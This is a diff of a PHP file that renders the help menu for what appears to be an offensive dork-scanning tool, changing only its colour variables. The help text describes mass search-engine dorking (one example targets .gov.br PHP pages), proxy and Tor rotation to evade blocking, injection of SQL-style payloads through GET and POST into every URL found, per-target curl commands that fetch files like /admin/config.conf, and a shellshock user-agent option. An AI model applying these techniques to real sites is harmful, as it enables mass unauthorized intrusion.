@@ -1,8 +1,8 @@
 <?php
 function __menu() {
-
+    $cor = $GLOBALS['COR'];
     return system("command clear") . __getOut("        
- {$_SESSION["c1"]}      
+ {$cor->whit}      
 
 
     ██░ ██    ▓█████     ██▓        ██▓███  
@@ -15,117 +15,117 @@ function __menu() {
     ░  ░░ ░      ░        ░ ░      ░░       
     ░  ░  ░      ░  ░       ░  ░            
                                          
-{$_SESSION["c1"]}[!]{$_SESSION["c0"]}Current PHP version=>[ {$_SESSION["c1"]}" . phpversion() . "{$_SESSION["c0"]} ]
-{$_SESSION["c1"]}[!]{$_SESSION["c0"]}Current script owner=>[ {$_SESSION["c1"]}" . get_current_user() . "{$_SESSION["c0"]} ]
-{$_SESSION["c1"]}[!]{$_SESSION["c0"]}Current uname=>[ {$_SESSION["c1"]}" . php_uname() . "{$_SESSION["c0"]} ]
-{$_SESSION["c1"]}[!]{$_SESSION["c0"]}Current pwd =>[ {$_SESSION["c1"]}" . getcwd() . "{$_SESSION["c0"]} ]
+{$cor->whit}[!]{$cor->end}Current PHP version=>[ {$cor->whit}" . phpversion() . "{$cor->end} ]
+{$cor->whit}[!]{$cor->end}Current script owner=>[ {$cor->whit}" . get_current_user() . "{$cor->end} ]
+{$cor->whit}[!]{$cor->end}Current uname=>[ {$cor->whit}" . php_uname() . "{$cor->end} ]
+{$cor->whit}[!]{$cor->end}Current pwd =>[ {$cor->whit}" . getcwd() . "{$cor->end} ]
 " . $_SESSION['config']['line'] . "
     
-{$_SESSION["c1"]}-h{$_SESSION["c0"]}
-{$_SESSION["c1"]}--help{$_SESSION["c0"]}   Alternative long length help command.
-{$_SESSION["c1"]}--ajuda{$_SESSION["c0"]}  Command to specify Help.
-{$_SESSION["c1"]}--info{$_SESSION["c0"]}   Information script.
-{$_SESSION["c1"]}--update{$_SESSION["c0"]} Code update.    
-{$_SESSION["c1"]}-q{$_SESSION["c0"]}       Choose which search engine you want through [{$_SESSION["c2"]}1...24{$_SESSION["c0"]}] / [{$_SESSION["c2"]}e1..6{$_SESSION["c0"]}]]:
+{$cor->whit}-h{$cor->end}
+{$cor->whit}--help{$cor->end}   Alternative long length help command.
+{$cor->whit}--ajuda{$cor->end}  Command to specify Help.
+{$cor->whit}--info{$cor->end}   Information script.
+{$cor->whit}--update{$cor->end} Code update.    
+{$cor->whit}-q{$cor->end}       Choose which search engine you want through [{$cor->yell}1...24{$cor->end}] / [{$cor->yell}e1..6{$cor->end}]]:
      [options]:
-     {$_SESSION["c1"]}1{$_SESSION["c0"]}   - {$_SESSION["c2"]}GOOGLE / (CSE) GENERIC RANDOM / API
-     {$_SESSION["c1"]}2{$_SESSION["c0"]}   - {$_SESSION["c2"]}BING
-     {$_SESSION["c1"]}3{$_SESSION["c0"]}   - {$_SESSION["c2"]}YAHOO BR
-     {$_SESSION["c1"]}4{$_SESSION["c0"]}   - {$_SESSION["c2"]}ASK
-     {$_SESSION["c1"]}6{$_SESSION["c0"]}   - {$_SESSION["c2"]}GOOGLE (API)
-     {$_SESSION["c1"]}7{$_SESSION["c0"]}   - {$_SESSION["c2"]}LYCOS
-     {$_SESSION["c1"]}8{$_SESSION["c0"]}   - {$_SESSION["c2"]}UOL BR
-     {$_SESSION["c1"]}9{$_SESSION["c0"]}   - {$_SESSION["c2"]}YAHOO US
-     {$_SESSION["c1"]}10{$_SESSION["c0"]}  - {$_SESSION["c2"]}SAPO
-     {$_SESSION["c1"]}11{$_SESSION["c0"]}  - {$_SESSION["c2"]}DMOZ
-     {$_SESSION["c1"]}12{$_SESSION["c0"]}  - {$_SESSION["c2"]}GIGABLAST
-     {$_SESSION["c1"]}13{$_SESSION["c0"]}  - {$_SESSION["c2"]}NEVER
-     {$_SESSION["c1"]}17{$_SESSION["c0"]}  - {$_SESSION["c2"]}HOTBUSCA
-     {$_SESSION["c1"]}19{$_SESSION["c0"]}  - {$_SESSION["c2"]}HKSEARCH
-     {$_SESSION["c1"]}20{$_SESSION["c0"]}  - {$_SESSION["c2"]}EZILION
-     {$_SESSION["c1"]}21{$_SESSION["c0"]}  - {$_SESSION["c2"]}SOGOU
-     {$_SESSION["c1"]}22{$_SESSION["c0"]}  - {$_SESSION["c2"]}DUCK DUCK GO
-     {$_SESSION["c1"]}24{$_SESSION["c0"]}  - {$_SESSION["c2"]}GOOGLE(CSE) GENERIC RANDOM
-     {$_SESSION["c1"]}25{$_SESSION["c0"]}  - {$_SESSION["c2"]}EXALEAD
-     {$_SESSION["c1"]}26{$_SESSION["c0"]}  - {$_SESSION["c2"]}STARTPAGE
-     {$_SESSION["c1"]}27{$_SESSION["c0"]}  - {$_SESSION["c2"]}QWANT
+     {$cor->whit}1{$cor->end}   - {$cor->yell}GOOGLE / (CSE) GENERIC RANDOM / API
+     {$cor->whit}2{$cor->end}   - {$cor->yell}BING
+     {$cor->whit}3{$cor->end}   - {$cor->yell}YAHOO BR
+     {$cor->whit}4{$cor->end}   - {$cor->yell}ASK
+     {$cor->whit}6{$cor->end}   - {$cor->yell}GOOGLE (API)
+     {$cor->whit}7{$cor->end}   - {$cor->yell}LYCOS
+     {$cor->whit}8{$cor->end}   - {$cor->yell}UOL BR
+     {$cor->whit}9{$cor->end}   - {$cor->yell}YAHOO US
+     {$cor->whit}10{$cor->end}  - {$cor->yell}SAPO
+     {$cor->whit}11{$cor->end}  - {$cor->yell}DMOZ
+     {$cor->whit}12{$cor->end}  - {$cor->yell}GIGABLAST
+     {$cor->whit}13{$cor->end}  - {$cor->yell}NEVER
+     {$cor->whit}17{$cor->end}  - {$cor->yell}HOTBUSCA
+     {$cor->whit}19{$cor->end}  - {$cor->yell}HKSEARCH
+     {$cor->whit}20{$cor->end}  - {$cor->yell}EZILION
+     {$cor->whit}21{$cor->end}  - {$cor->yell}SOGOU
+     {$cor->whit}22{$cor->end}  - {$cor->yell}DUCK DUCK GO
+     {$cor->whit}24{$cor->end}  - {$cor->yell}GOOGLE(CSE) GENERIC RANDOM
+     {$cor->whit}25{$cor->end}  - {$cor->yell}EXALEAD
+     {$cor->whit}26{$cor->end}  - {$cor->yell}STARTPAGE
+     {$cor->whit}27{$cor->end}  - {$cor->yell}QWANT
      ----------------------------------------
                  SPECIAL MOTORS
      ----------------------------------------
-     {$_SESSION["c1"]}e1{$_SESSION["c0"]}  - {$_SESSION["c2"]}TOR FIND
-     {$_SESSION["c1"]}e2{$_SESSION["c0"]}  - {$_SESSION["c2"]}ELEPHANT
-     {$_SESSION["c1"]}e3{$_SESSION["c0"]}  - {$_SESSION["c2"]}TORSEARCH
-     {$_SESSION["c1"]}e4{$_SESSION["c0"]}  - {$_SESSION["c2"]}GORCH
-     {$_SESSION["c1"]}e5{$_SESSION["c0"]}  - {$_SESSION["c2"]}WIKILEAKS
-     {$_SESSION["c1"]}e6{$_SESSION["c0"]}  - {$_SESSION["c2"]}AHMIA
-     {$_SESSION["c1"]}e7{$_SESSION["c0"]}  - {$_SESSION["c2"]}OTN
-     {$_SESSION["c1"]}e8{$_SESSION["c0"]}  - {$_SESSION["c2"]}EXPLOITS SHODAN
+     {$cor->whit}e1{$cor->end}  - {$cor->yell}TOR FIND
+     {$cor->whit}e2{$cor->end}  - {$cor->yell}ELEPHANT
+     {$cor->whit}e3{$cor->end}  - {$cor->yell}TORSEARCH
+     {$cor->whit}e4{$cor->end}  - {$cor->yell}GORCH
+     {$cor->whit}e5{$cor->end}  - {$cor->yell}WIKILEAKS
+     {$cor->whit}e6{$cor->end}  - {$cor->yell}AHMIA
+     {$cor->whit}e7{$cor->end}  - {$cor->yell}OTN
+     {$cor->whit}e8{$cor->end}  - {$cor->yell}EXPLOITS SHODAN
      ----------------------------------------
-     {$_SESSION["c1"]}all{$_SESSION["c0"]} - {$_SESSION["c2"]}All search engines / not special motors{$_SESSION["c0"]}
-     Default:    {$_SESSION["c1"]}1{$_SESSION["c0"]}
-     Example: {$_SESSION["c1"]}-q{$_SESSION["c0"]} {$_SESSION["c2"]}{op}{$_SESSION["c0"]}
-     Usage:   {$_SESSION["c1"]}-q{$_SESSION["c0"]} {$_SESSION["c2"]}1{$_SESSION["c0"]}
-              {$_SESSION["c1"]}-q{$_SESSION["c0"]} {$_SESSION["c2"]}5{$_SESSION["c0"]}
-               Using more than one engine:  {$_SESSION["c1"]}-q{$_SESSION["c0"]} {$_SESSION["c2"]}1,2,5,6,11,24{$_SESSION["c0"]}
-               Using all engines:      {$_SESSION["c1"]}-q{$_SESSION["c0"]} {$_SESSION["c2"]}all{$_SESSION["c0"]}
+     {$cor->whit}all{$cor->end} - {$cor->yell}All search engines / not special motors{$cor->end}
+     Default:    {$cor->whit}1{$cor->end}
+     Example: {$cor->whit}-q{$cor->end} {$cor->yell}{op}{$cor->end}
+     Usage:   {$cor->whit}-q{$cor->end} {$cor->yell}1{$cor->end}
+              {$cor->whit}-q{$cor->end} {$cor->yell}5{$cor->end}
+               Using more than one engine:  {$cor->whit}-q{$cor->end} {$cor->yell}1,2,5,6,11,24{$cor->end}
+               Using all engines:      {$cor->whit}-q{$cor->end} {$cor->yell}all{$cor->end}
      
- {$_SESSION["c1"]}--proxy{$_SESSION["c0"]} Choose which proxy you want to use through the search engine:
-     Example: {$_SESSION["c1"]}--proxy {$_SESSION["c2"]}{proxy:port}{$_SESSION["c0"]}
-     Usage:   {$_SESSION["c1"]}--proxy {$_SESSION["c2"]}localhost:8118{$_SESSION["c0"]}
-              {$_SESSION["c1"]}--proxy {$_SESSION["c2"]}socks5://googleinurl@localhost:9050{$_SESSION["c0"]}
-              {$_SESSION["c1"]}--proxy {$_SESSION["c2"]}http://admin:12334@172.16.0.90:8080{$_SESSION["c0"]}
+ {$cor->whit}--proxy{$cor->end} Choose which proxy you want to use through the search engine:
+     Example: {$cor->whit}--proxy {$cor->yell}{proxy:port}{$cor->end}
+     Usage:   {$cor->whit}--proxy {$cor->yell}localhost:8118{$cor->end}
+              {$cor->whit}--proxy {$cor->yell}socks5://googleinurl@localhost:9050{$cor->end}
+              {$cor->whit}--proxy {$cor->yell}http://admin:12334@172.16.0.90:8080{$cor->end}
    
- {$_SESSION["c1"]}--proxy-file{$_SESSION["c0"]} Set font file to randomize your proxy to each search engine.
-     Example: {$_SESSION["c1"]}--proxy-file {$_SESSION["c2"]}{proxys}{$_SESSION["c0"]}
-     Usage:   {$_SESSION["c1"]}--proxy-file {$_SESSION["c2"]}proxys_list.txt{$_SESSION["c0"]}
+ {$cor->whit}--proxy-file{$cor->end} Set font file to randomize your proxy to each search engine.
+     Example: {$cor->whit}--proxy-file {$cor->yell}{proxys}{$cor->end}
+     Usage:   {$cor->whit}--proxy-file {$cor->yell}proxys_list.txt{$cor->end}
 
- {$_SESSION["c1"]}--time-proxy{$_SESSION["c0"]} Set the time how often the proxy will be exchanged.
-     Example: {$_SESSION["c1"]}--time-proxy {$_SESSION["c2"]}{second}{$_SESSION["c0"]}
-     Usage:   {$_SESSION["c1"]}--time-proxy {$_SESSION["c2"]}10{$_SESSION["c0"]}
+ {$cor->whit}--time-proxy{$cor->end} Set the time how often the proxy will be exchanged.
+     Example: {$cor->whit}--time-proxy {$cor->yell}{second}{$cor->end}
+     Usage:   {$cor->whit}--time-proxy {$cor->yell}10{$cor->end}
 
- {$_SESSION["c1"]}--proxy-http-file{$_SESSION["c0"]} Set file with urls http proxy, 
+ {$cor->whit}--proxy-http-file{$cor->end} Set file with urls http proxy, 
      are used to bular capch search engines
-     Example: {$_SESSION["c1"]}--proxy-http-file {$_SESSION["c2"]}{youfilehttp}{$_SESSION["c0"]}
-     Usage:   {$_SESSION["c1"]}--proxy-http-file {$_SESSION["c2"]}http_proxys.txt{$_SESSION["c0"]}
+     Example: {$cor->whit}--proxy-http-file {$cor->yell}{youfilehttp}{$cor->end}
+     Usage:   {$cor->whit}--proxy-http-file {$cor->yell}http_proxys.txt{$cor->end}
          
 
- {$_SESSION["c1"]}--tor-random{$_SESSION["c0"]} Enables the TOR function, each usage links an unique IP.
+ {$cor->whit}--tor-random{$cor->end} Enables the TOR function, each usage links an unique IP.
  
- {$_SESSION["c1"]}-t{$_SESSION["c0"]}  Choose the validation type: op {$_SESSION["c2"]}1, 2, 3, 4, 5{$_SESSION["c0"]}
+ {$cor->whit}-t{$cor->end}  Choose the validation type: op {$cor->yell}1, 2, 3, 4, 5{$cor->end}
      [options]:
-     {$_SESSION["c2"]}1{$_SESSION["c0"]}   - The first type uses default errors considering the script:
+     {$cor->yell}1{$cor->end}   - The first type uses default errors considering the script:
      It establishes connection with the exploit through the get method.
-     Demo: www.alvo.com.br/pasta/index.php?id={$_SESSION["c3"]}{exploit}{$_SESSION["c0"]}
+     Demo: www.alvo.com.br/pasta/index.php?id={$cor->red1}{exploit}{$cor->end}
    
-     {$_SESSION["c2"]}2{$_SESSION["c0"]}   -  The second type tries to valid the error defined by: {$_SESSION["c1"]}-a={$_SESSION["c2"]}'VALUE_INSIDE_THE _TARGET'{$_SESSION["c0"]}
+     {$cor->yell}2{$cor->end}   -  The second type tries to valid the error defined by: {$cor->whit}-a={$cor->yell}'VALUE_INSIDE_THE _TARGET'{$cor->end}
      It also establishes connection with the exploit through the get method
-     Demo: www.alvo.com.br/pasta/index.php?id={$_SESSION["c3"]}{exploit}{$_SESSION["c0"]}
+     Demo: www.alvo.com.br/pasta/index.php?id={$cor->red1}{exploit}{$cor->end}
    
-     {$_SESSION["c2"]}3{$_SESSION["c0"]}   - The third type combine both first and second types:
+     {$cor->yell}3{$cor->end}   - The third type combine both first and second types:
      Then, of course, it also establishes connection with the exploit through the get method
-     Demo: www.target.com.br{$_SESSION["c3"]}{exploit}{$_SESSION["c0"]}
-     Default:    {$_SESSION["c2"]}1{$_SESSION["c0"]}
-     Example: {$_SESSION["c1"]}-t {$_SESSION["c2"]}{op}{$_SESSION["c0"]}
-     Usage:   {$_SESSION["c1"]}-t {$_SESSION["c2"]}1{$_SESSION["c0"]}
+     Demo: www.target.com.br{$cor->red1}{exploit}{$cor->end}
+     Default:    {$cor->yell}1{$cor->end}
+     Example: {$cor->whit}-t {$cor->yell}{op}{$cor->end}
+     Usage:   {$cor->whit}-t {$cor->yell}1{$cor->end}
      
-     {$_SESSION["c2"]}4{$_SESSION["c0"]}   - The fourth type a validation based on source file and will be enabled scanner standard functions.
+     {$cor->yell}4{$cor->end}   - The fourth type a validation based on source file and will be enabled scanner standard functions.
      The source file their values are concatenated with target url.
-     - Set your target with command {$_SESSION["c1"]}--target {$_SESSION["c2"]}{http://target}{$_SESSION["c0"]}
-     - Set your file with command {$_SESSION["c1"]}-o {$_SESSION["c2"]}{file}{$_SESSION["c0"]}
+     - Set your target with command {$cor->whit}--target {$cor->yell}{http://target}{$cor->end}
+     - Set your file with command {$cor->whit}-o {$cor->yell}{file}{$cor->end}
      Explicative:
      Source file values:
      /admin/index.php?id=
      /pag/index.php?id=
      /brazil.php?new=
      Demo: 
-     www.target.com.br/admin/index.php?id={$_SESSION["c3"]}{exploit}{$_SESSION["c0"]}
-     www.target.com.br/pag/index.php?id={$_SESSION["c3"]}{exploit}{$_SESSION["c0"]}
-     www.target.com.br/brazil.php?new={$_SESSION["c3"]}{exploit}{$_SESSION["c0"]}
+     www.target.com.br/admin/index.php?id={$cor->red1}{exploit}{$cor->end}
+     www.target.com.br/pag/index.php?id={$cor->red1}{exploit}{$cor->end}
+     www.target.com.br/brazil.php?new={$cor->red1}{exploit}{$cor->end}
      
-     {$_SESSION["c2"]}5{$_SESSION["c0"]}   - (FIND PAGE) The fifth type of validation based on the source file,
+     {$cor->yell}5{$cor->end}   - (FIND PAGE) The fifth type of validation based on the source file,
      Will be enabled only one validation code 200 on the target server, or if the url submit such code will be considered vulnerable.
-     - Set your target with command {$_SESSION["c1"]}--target {$_SESSION["c2"]}{http://target}{$_SESSION["c0"]}
-     - Set your file with command {$_SESSION["c1"]}-o {$_SESSION["c2"]}{file}{$_SESSION["c0"]}
+     - Set your target with command {$cor->whit}--target {$cor->yell}{http://target}{$cor->end}
+     - Set your file with command {$cor->whit}-o {$cor->yell}{file}{$cor->end}
      Explicative:
      Source file values:
      /admin/admin.php
@@ -138,318 +138,318 @@ function __menu() {
      Observation: If it shows the code 200 will be separated in the output file
 
      DEFAULT ERRORS:  
-     {$_SESSION["c11"]}
+     {$cor->mag1}
      [*]JAVA INFINITYDB, [*]LOCAL FILE INCLUSION, [*]ZIMBRA MAIL,           [*]ZEND FRAMEWORK, 
      [*]ERROR MARIADB,   [*]ERROR MYSQL,          [*]ERROR JBOSSWEB,        [*]ERROR MICROSOFT,
      [*]ERROR ODBC,      [*]ERROR POSTGRESQL,     [*]ERROR JAVA INFINITYDB, [*]ERROR PHP,
      [*]CMS WORDPRESS,   [*]SHELL WEB,            [*]ERROR JDBC,            [*]ERROR ASP,
      [*]ERROR ORACLE,    [*]ERROR DB2,            [*]JDBC CFM,              [*]ERROS LUA, 
      [*]ERROR INDEFINITE
-     {$_SESSION["c0"]}
+     {$cor->end}
          
- {$_SESSION["c1"]}--dork{$_SESSION["c0"]} Defines which dork the search engine will use.
-     Example: {$_SESSION["c1"]}--dork {$_SESSION["c2"]}{dork}{$_SESSION["c0"]}
-     Usage:   {$_SESSION["c1"]}--dork {$_SESSION["c2"]}'site:.gov.br inurl:php? id'{$_SESSION["c0"]}
+ {$cor->whit}--dork{$cor->end} Defines which dork the search engine will use.
+     Example: {$cor->whit}--dork {$cor->yell}{dork}{$cor->end}
+     Usage:   {$cor->whit}--dork {$cor->yell}'site:.gov.br inurl:php? id'{$cor->end}
      - Using multiples dorks:
-     Example: {$_SESSION["c1"]}--dork {$_SESSION["c2"]}{[DORK]dork1[DORK]dork2[DORK]dork3}{$_SESSION["c0"]}
-     Usage:   {$_SESSION["c1"]}--dork {$_SESSION["c2"]}'[DORK]site:br[DORK]site:ar inurl:php[DORK]site:il inurl:asp'{$_SESSION["c0"]}
+     Example: {$cor->whit}--dork {$cor->yell}{[DORK]dork1[DORK]dork2[DORK]dork3}{$cor->end}
+     Usage:   {$cor->whit}--dork {$cor->yell}'[DORK]site:br[DORK]site:ar inurl:php[DORK]site:il inurl:asp'{$cor->end}
  
- {$_SESSION["c1"]}--dork-file{$_SESSION["c0"]} Set font file with your search dorks.
-     Example: {$_SESSION["c1"]}--dork-file {$_SESSION["c2"]}{dork_file}{$_SESSION["c0"]}
-     Usage:   {$_SESSION["c1"]}--dork-file {$_SESSION["c2"]}'dorks.txt'{$_SESSION["c0"]}
+ {$cor->whit}--dork-file{$cor->end} Set font file with your search dorks.
+     Example: {$cor->whit}--dork-file {$cor->yell}{dork_file}{$cor->end}
+     Usage:   {$cor->whit}--dork-file {$cor->yell}'dorks.txt'{$cor->end}
 
- {$_SESSION["c1"]}--exploit-get{$_SESSION["c0"]} Defines which exploit will be injected through the GET method to each URL found.
-     Example: {$_SESSION["c1"]}--exploit-get {$_SESSION["c3"]}{exploit_get}{$_SESSION["c0"]}
-     Usage:   {$_SESSION["c1"]}--exploit-get {$_SESSION["c3"]}\"?'´%270x27;\"{$_SESSION["c0"]}
+ {$cor->whit}--exploit-get{$cor->end} Defines which exploit will be injected through the GET method to each URL found.
+     Example: {$cor->whit}--exploit-get {$cor->red1}{exploit_get}{$cor->end}
+     Usage:   {$cor->whit}--exploit-get {$cor->red1}\"?'´%270x27;\"{$cor->end}
      
- {$_SESSION["c1"]}--exploit-post{$_SESSION["c0"]} Defines which exploit will be injected through the POST method to each URL found.
-     Example: {$_SESSION["c1"]}--exploit-post {$_SESSION["c3"]}{exploit_post}{$_SESSION["c0"]}
-     Usage:   {$_SESSION["c1"]}--exploit-post {$_SESSION["c3"]}'field1=valor1&field2=valor2&field3=?´0x273exploit;&botao=ok'{$_SESSION["c0"]}
+ {$cor->whit}--exploit-post{$cor->end} Defines which exploit will be injected through the POST method to each URL found.
+     Example: {$cor->whit}--exploit-post {$cor->red1}{exploit_post}{$cor->end}
+     Usage:   {$cor->whit}--exploit-post {$cor->red1}'field1=valor1&field2=valor2&field3=?´0x273exploit;&botao=ok'{$cor->end}
      
- {$_SESSION["c1"]}--exploit-command{$_SESSION["c0"]} Defines which exploit/parameter will be executed in the options: {$_SESSION["c1"]}--command-vul/{$_SESSION["c0"]} {$_SESSION["c1"]}--command-all{$_SESSION["c0"]}.   
-     The exploit-command will be identified by the paramaters: {$_SESSION["c1"]}--command-vul/{$_SESSION["c0"]} {$_SESSION["c1"]}--command-all as {$_SESSION["c6"]}_EXPLOIT_{$_SESSION["c0"]}      
-     Ex {$_SESSION["c1"]}--exploit-command {$_SESSION["c2"]}'/admin/config.conf' {$_SESSION["c1"]}--command-all {$_SESSION["c2"]}'curl -v {$_SESSION["c8"]}_TARGET_{$_SESSION["c6"]}_EXPLOIT_{$_SESSION["c2"]}'{$_SESSION["c0"]}
+ {$cor->whit}--exploit-command{$cor->end} Defines which exploit/parameter will be executed in the options: {$cor->whit}--command-vul/{$cor->end} {$cor->whit}--command-all{$cor->end}.   
+     The exploit-command will be identified by the paramaters: {$cor->whit}--command-vul/{$cor->end} {$cor->whit}--command-all as {$cor->mag}_EXPLOIT_{$cor->end}      
+     Ex {$cor->whit}--exploit-command {$cor->yell}'/admin/config.conf' {$cor->whit}--command-all {$cor->yell}'curl -v {$cor->blue}_TARGET_{$cor->mag}_EXPLOIT_{$cor->yell}'{$cor->end}
      _TARGET_ is the specified URL/TARGET obtained by the process
-     _EXPLOIT_ is the exploit/parameter defined by the option {$_SESSION["c1"]}--exploit-command{$_SESSION["c0"]}.
-     Example: {$_SESSION["c1"]}--exploit-command {$_SESSION["c2"]}{exploit-command}{$_SESSION["c0"]}
-     Usage:   {$_SESSION["c1"]}--exploit-command {$_SESSION["c2"]}'/admin/config.conf'{$_SESSION["c0"]}  
+     _EXPLOIT_ is the exploit/parameter defined by the option {$cor->whit}--exploit-command{$cor->end}.
+     Example: {$cor->whit}--exploit-command {$cor->yell}{exploit-command}{$cor->end}
+     Usage:   {$cor->whit}--exploit-command {$cor->yell}'/admin/config.conf'{$cor->end}  
      
- {$_SESSION["c1"]}-a{$_SESSION["c0"]}  Specify the string that will be used on the search script:
-     Example: {$_SESSION["c1"]}-a {$_SESSION["c2"]}{string}{$_SESSION["c0"]}
-     Usage:   {$_SESSION["c1"]}-a {$_SESSION["c2"]}'<title>hello world</title>'{$_SESSION["c0"]}
+ {$cor->whit}-a{$cor->end}  Specify the string that will be used on the search script:
+     Example: {$cor->whit}-a {$cor->yell}{string}{$cor->end}
+     Usage:   {$cor->whit}-a {$cor->yell}'<title>hello world</title>'{$cor->end}
      
- {$_SESSION["c1"]}-d{$_SESSION["c0"]}  Specify the script usage op {$_SESSION["c2"]}1, 2, 3, 4, 5.{$_SESSION["c0"]}
-     Example: {$_SESSION["c1"]}-d {$_SESSION["c2"]}{op}{$_SESSION["c0"]}
-     Usage:   {$_SESSION["c1"]}-d {$_SESSION["c2"]}1 {$_SESSION["c0"]}/URL of the search engine.
-              {$_SESSION["c1"]}-d {$_SESSION["c2"]}2 {$_SESSION["c0"]}/Show all the url.
-              {$_SESSION["c1"]}-d {$_SESSION["c2"]}3 {$_SESSION["c0"]}/Detailed request of every URL.
-              {$_SESSION["c1"]}-d {$_SESSION["c2"]}4 {$_SESSION["c0"]}/Shows the HTML of every URL.
-              {$_SESSION["c1"]}-d {$_SESSION["c2"]}5 {$_SESSION["c0"]}/Detailed request of all URLs.
-              {$_SESSION["c1"]}-d {$_SESSION["c2"]}6 {$_SESSION["c0"]}/Detailed PING - PONG irc.    
+ {$cor->whit}-d{$cor->end}  Specify the script usage op {$cor->yell}1, 2, 3, 4, 5.{$cor->end}
+     Example: {$cor->whit}-d {$cor->yell}{op}{$cor->end}
+     Usage:   {$cor->whit}-d {$cor->yell}1 {$cor->end}/URL of the search engine.
+              {$cor->whit}-d {$cor->yell}2 {$cor->end}/Show all the url.
+              {$cor->whit}-d {$cor->yell}3 {$cor->end}/Detailed request of every URL.
+              {$cor->whit}-d {$cor->yell}4 {$cor->end}/Shows the HTML of every URL.
+              {$cor->whit}-d {$cor->yell}5 {$cor->end}/Detailed request of all URLs.
+              {$cor->whit}-d {$cor->yell}6 {$cor->end}/Detailed PING - PONG irc.    
              
- {$_SESSION["c1"]}-s{$_SESSION["c0"]}  Specify the output file where it will be saved the vulnerable URLs.
+ {$cor->whit}-s{$cor->end}  Specify the output file where it will be saved the vulnerable URLs.
      
-     Example: {$_SESSION["c1"]}-s {$_SESSION["c2"]}{file}{$_SESSION["c0"]}
-     Usage:   {$_SESSION["c1"]}-s {$_SESSION["c2"]}your_file.txt
+     Example: {$cor->whit}-s {$cor->yell}{file}{$cor->end}
+     Usage:   {$cor->whit}-s {$cor->yell}your_file.txt
      
- {$_SESSION["c1"]}-o{$_SESSION["c0"]}  Manually manage the vulnerable URLs you want to use from a file, without using a search engine.
-     Example: {$_SESSION["c1"]}-o {$_SESSION["c2"]}{file_where_my_urls_are}{$_SESSION["c0"]}
-     Usage:   {$_SESSION["c1"]}-o {$_SESSION["c2"]}tests.txt
+ {$cor->whit}-o{$cor->end}  Manually manage the vulnerable URLs you want to use from a file, without using a search engine.
+     Example: {$cor->whit}-o {$cor->yell}{file_where_my_urls_are}{$cor->end}
+     Usage:   {$cor->whit}-o {$cor->yell}tests.txt
    
- {$_SESSION["c1"]}--persist{$_SESSION["c0"]}  Attempts when Google blocks your search.
+ {$cor->whit}--persist{$cor->end}  Attempts when Google blocks your search.
      The script tries to another google host / default = 4
-     Example: {$_SESSION["c1"]}--persist {$_SESSION["c2"]}{number_attempts}{$_SESSION["c0"]}
-     Usage:   {$_SESSION["c1"]}--persist {$_SESSION["c2"]}7
+     Example: {$cor->whit}--persist {$cor->yell}{number_attempts}{$cor->end}
+     Usage:   {$cor->whit}--persist {$cor->yell}7
 
- {$_SESSION["c1"]}--ifredirect{$_SESSION["c0"]}  Return validation method post REDIRECT_URL
-     Example: {$_SESSION["c1"]}--ifredirect {$_SESSION["c2"]}{string_validation}{$_SESSION["c0"]}
-     Usage:   {$_SESSION["c1"]}--ifredirect {$_SESSION["c2"]}'/admin/painel.php'
+ {$cor->whit}--ifredirect{$cor->end}  Return validation method post REDIRECT_URL
+     Example: {$cor->whit}--ifredirect {$cor->yell}{string_validation}{$cor->end}
+     Usage:   {$cor->whit}--ifredirect {$cor->yell}'/admin/painel.php'
 
- {$_SESSION["c1"]}-m{$_SESSION["c0"]}  Enable the search for emails on the urls specified.
+ {$cor->whit}-m{$cor->end}  Enable the search for emails on the urls specified.
   
- {$_SESSION["c1"]}-u{$_SESSION["c0"]}  Enables the search for URL lists on the host specified.
+ {$cor->whit}-u{$cor->end}  Enables the search for URL lists on the host specified.
 
- {$_SESSION["c1"]}--ua{$_SESSION["c0"]}  Enables the search for URL lists on the host specified using archive.org.
+ {$cor->whit}--ua{$cor->end}  Enables the search for URL lists on the host specified using archive.org.
 
- {$_SESSION["c1"]}--gc{$_SESSION["c0"]} Enable validation of values ​​with google webcache.
+ {$cor->whit}--gc{$cor->end} Enable validation of values ​​with google webcache.
      
- {$_SESSION["c1"]}--pr{$_SESSION["c0"]}  Progressive scan, used to set operators (dorks), 
+ {$cor->whit}--pr{$cor->end}  Progressive scan, used to set operators (dorks), 
      makes the search of a dork and valid results, then goes a dork at a time.
   
- {$_SESSION["c1"]}--file-cookie{$_SESSION["c0"]} Open cookie file.
+ {$cor->whit}--file-cookie{$cor->end} Open cookie file.
      
- {$_SESSION["c1"]}--save-as{$_SESSION["c0"]} Save results in a certain place.
+ {$cor->whit}--save-as{$cor->end} Save results in a certain place.
 
- {$_SESSION["c1"]}--shellshock{$_SESSION["c0"]} Explore shellshock vulnerability by setting a malicious user-agent.
+ {$cor->whit}--shellshock{$cor->end} Explore shellshock vulnerability by setting a malicious user-agent.
  
- {$_SESSION["c1"]}--popup{$_SESSION["c0"]} Run --command all or vuln in a parallel terminal.
+ {$cor->whit}--popup{$cor->end} Run --command all or vuln in a parallel terminal.
 
- {$_SESSION["c1"]}--cms-check{$_SESSION["c0"]} Enable simple check if the url / target is using CMS.
+ {$cor->whit}--cms-check{$cor->end} Enable simple check if the url / target is using CMS.
 
- {$_SESSION["c1"]}--no-banner{$_SESSION["c0"]} Remove the script presentation banner.
+ {$cor->whit}--no-banner{$cor->end} Remove the script presentation banner.
      
- {$_SESSION["c1"]}--unique{$_SESSION["c0"]} Filter results in unique domains.
+ {$cor->whit}--unique{$cor->end} Filter results in unique domains.
 
- {$_SESSION["c1"]}--beep{$_SESSION["c0"]} Beep sound when a vulnerability is found.
+ {$cor->whit}--beep{$cor->end} Beep sound when a vulnerability is found.
      
- {$_SESSION["c1"]}--alexa-rank{$_SESSION["c0"]} Show alexa positioning in the results.
+ {$cor->whit}--alexa-rank{$cor->end} Show alexa positioning in the results.
      
- {$_SESSION["c1"]}--robots{$_SESSION["c0"]} Show values file robots and extract urls.
+ {$cor->whit}--robots{$cor->end} Show values file robots and extract urls.
       
- {$_SESSION["c1"]}--range{$_SESSION["c0"]} Set range IP.
-      Example: {$_SESSION["c1"]}--range {$_SESSION["c2"]}{range_start,rage_end}{$_SESSION["c0"]}
-      Usage:   {$_SESSION["c1"]}--range {$_SESSION["c2"]}'172.16.0.5#172.16.0.255'
+ {$cor->whit}--range{$cor->end} Set range IP.
+      Example: {$cor->whit}--range {$cor->yell}{range_start,rage_end}{$cor->end}
+      Usage:   {$cor->whit}--range {$cor->yell}'172.16.0.5#172.16.0.255'
 
- {$_SESSION["c1"]}--range-rand{$_SESSION["c0"]} Set amount of random ips.
-      Example: {$_SESSION["c1"]}--range-rand {$_SESSION["c2"]}{rand}{$_SESSION["c0"]}
-      Usage:   {$_SESSION["c1"]}--range-rand {$_SESSION["c2"]}'50'
+ {$cor->whit}--range-rand{$cor->end} Set amount of random ips.
